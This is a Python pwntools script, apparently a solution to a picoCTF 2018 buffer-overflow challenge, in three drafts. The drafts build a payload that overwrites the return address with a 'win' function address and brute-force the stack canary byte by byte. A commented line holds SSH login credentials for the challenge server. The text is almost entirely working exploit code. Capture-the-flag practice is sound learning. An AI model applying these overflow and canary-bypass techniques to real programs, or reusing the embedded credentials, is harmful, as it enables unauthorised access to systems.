# from pwn import *
# import string

# # s = ssh(host='2018shell1.picoctf.com',user='dr3dd',password='yoyoman12345')

# # f = open('rockyou.txt','r')
# # passd = f.read().split('\n')
# # canry=""
# # for i in range(6):
# #     for f in string.printable:
# # p = s.process('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
# # elf = ELF('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
# p = process('./vuln')
# # elf = ELF('./vuln')
# # win = elf.symbols['win']
# win = 134514411

# payload = ""
# payload += "1"*64
# payload += "666\n"
# payload += "A"*16
# payload += p32(win)

# p.send_raw(payload)
# x= p.recv(1024)
# print x
# p.close()

                  
# # print(canry) 



from pwn import *
import string

#s = ssh(host='2018shell1.picoctf.com',user='dr3dd',password='yoyoman12345')

# f = open('rockyou.txt','r')
# passd = f.read().split('\n')
# canry=""
# for i in range(6):
#     for f in string.printable:
p = process('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
# p = process('./vuln')
# # elf = ELF('./vuln')
win = 134514411

payload = ""
payload += "1"*64
payload += "666\n"
payload += "1"*16
payload += p32(win)

p.recv(1024)
p.send_raw(payload)
print p.recvall()
p.close()

# print(canry) 

from pwn import *
import string

#s = ssh(host='2018shell1.picoctf.com',user='dr3dd',password='yoyoman12345')

# f = open('rockyou.txt','r')
# passd = f.read().split('\n')
canry=""
for i in range(4):
    for f in string.printable:
        p = process('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
        elf = ELF('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
        # # p = process('./vuln')
        # # elf = ELF('./vuln')
        win = elf.symbols['win']

        payload = ""
        payload += "1"*64
        payload += canry+f
        #payload += "A"*16
        #payload += p32(win)

        p.recv(1024)
        p.send(payload)
        x= p.recv(1024)
        print x
        p.close()
        if "Flag" in x :
                canry += f
                break

print(canry,len(canry)) 